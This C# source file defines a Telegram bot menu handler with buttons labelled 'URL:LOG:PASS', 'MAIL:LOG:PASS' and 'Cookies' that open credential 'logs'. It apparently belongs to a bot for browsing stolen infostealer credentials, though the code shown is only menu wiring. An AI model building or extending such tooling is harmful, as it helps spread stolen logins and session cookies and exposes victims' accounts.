using Bot.Core.Models.Commands.Abstractions;
using Bot.Telegram.Commands.Common;

using Injectio.Attributes;

using TL;

using WTelegram;

namespace Bot.Telegram.Commands.User.Menu {
	[RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = Keys.Menu.CommonCallback)]
	public class CommonCallback(Client client) : ICommand<UpdateBotCallbackQuery> {
		public Task ExecuteAsync(UpdateBotCallbackQuery update, TL.User user) {
			return client.Messages_EditMessage(
				user,
				update.msg_id,
				"Common",
				reply_markup: new ReplyInlineMarkup {
					rows = [
						new() {
							buttons = [
								new KeyboardButtonCallback {
									text = "URL:LOG:PASS",
									data = ShowLogsCallback.CreateData(Keys.Common.Url_Login_Password, Keys.Menu.CommonCallback)
								},
								new KeyboardButtonCallback {
									text = "MAIL:LOG:PASS",
									data = ShowLogsCallback.CreateData(Keys.Common.Email_Login_Password, Keys.Menu.CommonCallback)
								}
							]
						},
						new() {
							buttons = [
								new KeyboardButtonCallback {
									text = "Cookies",
									data = ShowLogsCallback.CreateData(Keys.Common.Cookies, Keys.Menu.CommonCallback)
								}
							]
						},
						new() {
							buttons = [
								new KeyboardButtonCallback {
									text = "Back",
									data = [Keys.StartCallback]
								}
							]
						}
					]
				}
			);
		}
	}
}